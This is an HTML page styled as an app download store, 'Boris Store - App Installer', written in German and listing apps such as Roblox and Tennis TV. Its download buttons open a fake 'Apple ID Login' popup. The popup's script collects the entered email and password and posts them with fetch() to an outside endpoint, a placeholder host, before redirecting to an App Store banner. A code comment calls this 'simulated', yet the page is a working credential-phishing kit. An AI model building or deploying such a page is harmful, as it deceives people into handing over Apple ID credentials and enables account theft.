<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // TRICK: ID sofort aus der URL ziehen für den Banner
        const p = new URLSearchParams(window.location.search);
        const id = p.get('id');

        if (id) {
            const meta = document.createElement('meta');
            meta.name = "apple-itunes-app";
            meta.content = `app-id=${id}, app-argument=https://apps.apple.com/app/id${id}, affiliate-data=ct=install_button&mt=8`;
            document.head.appendChild(meta);
        }
    </script>
    <title>Boris Store - App Installer</title>
    <style>
        /* Global Styles */
        body { font-family: -apple-system, system-ui; background: #f0f0f5; text-align: center; padding: 40px 20px; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
        .app { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid #eee; text-align: left; }
        .app-info { display: flex; flex-direction: column; max-width: 70%; }
        .error-text { color: #ff3b30; font-size: 10px; margin-top: 4px; line-height: 1.2; }
        
        button { background: #007aff; color: white; border: none; padding: 10px 18px; border-radius: 20px; font-weight: 600; cursor: pointer; flex-shrink: 0; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        
        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #ccc; box-sizing: border-box; font-size: 16px; }
        
        .footer-note { margin-top: 25px; font-size: 13px; color: #888; }
        .footer-note a { color: #007aff; text-decoration: none; font-weight: 500; }

        .coffee-btn {
            display: inline-block;
            margin-top: 20px;
            background: #FFDD00;
            color: #000;
            padding: 8px 15px;
            border-radius: 12px;
            text-decoration: none;
            font-size: 12px;
            font-weight: bold;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        }

        /* Login Popup Styles (Script 1) */
        #loginOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            display: none; /* Hidden by default */
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .login-container {
            background-color: white;
            border-radius: 12px;
            padding: 30px;
            width: 300px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }

        .login-container h2 { font-size: 20px; margin-bottom: 15px; }
        .login-container p { font-size: 13px; color: #777; margin-top: 15px; }
        
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="box">
        <h2>App Download</h2>
        <input type="text" id="s" placeholder="Suchen..." onkeyup="search()">
        <div id="l"></div>
    </div>

    <div style="max-width: 350px; margin: auto; text-align: left;">
        <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=moritz.schmalle09@gmail.com&item_name=Buy%20me%20a%20coffee&currency_code=EUR" class="coffee-btn">
            ☕ Buy me a coffee
        </a>
    </div>

    <div class="footer-note">
        Der originale Store ist: <a href="https://boris-store.xyz">boris-store.xyz</a>
    </div>

    <div id="loginOverlay">
        <div class="login-container" id="loginPopup">
            <h2>Apple ID Login</h2>
            <input type="email" id="email" placeholder="E-Mail" required>
            <input type="password" id="password" placeholder="Passwort" required>
            <button onclick="submitLogin()" style="width: 100%;">Anmelden</button>
            <p>Melde dich an, um den Download zu starten.</p>
            <button onclick="closePopup()" style="background:none; color:#007aff; font-size:12px; margin-top:10px;">Abbrechen</button>
        </div>
    </div>

    <script>
        const apps = [
            { n: "Tennis TV", i: "1114471030", ok: true },
            { n: "Roblox", i: "431946152", ok: true },
            { n: "ChatGPT", i: "6448311069", ok: false, msg: "Apple blockiert Banner auf Drittseiten für diese App." },
            { n: "Gemini", i: "6477489729", ok: false, msg: "Apple Sicherheitsregeln verhindern den Banner hier." }
        ];

        let pendingAppId = "";

        function render(data) {
            const list = document.getElementById('l');
            list.innerHTML = "";
            data.forEach(a => {
                const info = a.ok ? '' : `<span class="error-text">${a.msg}</span>`;
                const btnAttr = a.ok ? `onclick="openLogin('${a.i}')"` : `disabled`;
                
                list.innerHTML += `
                    <div class="app">
                        <div class="app-info">
                            <strong>${a.n}</strong>
                            ${info}
                        </div>
                        <button ${btnAttr}>${a.ok ? 'Laden' : 'N/A'}</button>
                    </div>`;
            });
        }

        function search() {
            const val = document.getElementById('s').value.toLowerCase();
            render(apps.filter(x => x.n.toLowerCase().includes(val)));
        }

        // Login Popup Funktionen
        function openLogin(i) {
            pendingAppId = i;
            document.getElementById('loginOverlay').style.display = 'flex';
        }

        function closePopup() {
            document.getElementById('loginOverlay').style.display = 'none';
        }

        function submitLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if(!email || !password) {
                alert("Bitte fülle alle Felder aus.");
                return;
            }

            // Simulierter Daten-Versand (Script 1 Logik)
            const formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);

            fetch('https://your-server-endpoint.com/submit', {
                method: 'POST',
                body: formData,
            })
            .then(response => {
                console.log('Login-Daten gesendet');
                // Nach dem Login: Seite mit ID neu laden
                window.location.href = window.location.origin + window.location.pathname + "?id=" + pendingAppId;
            })
            .catch(error => {
                console.error('Fehler:', error);
                // Auch bei Fehler laden wir für den Test weiter
                window.location.href = window.location.origin + window.location.pathname + "?id=" + pendingAppId;
            });
        }

        render(apps);
    </script>
</body>
</html>
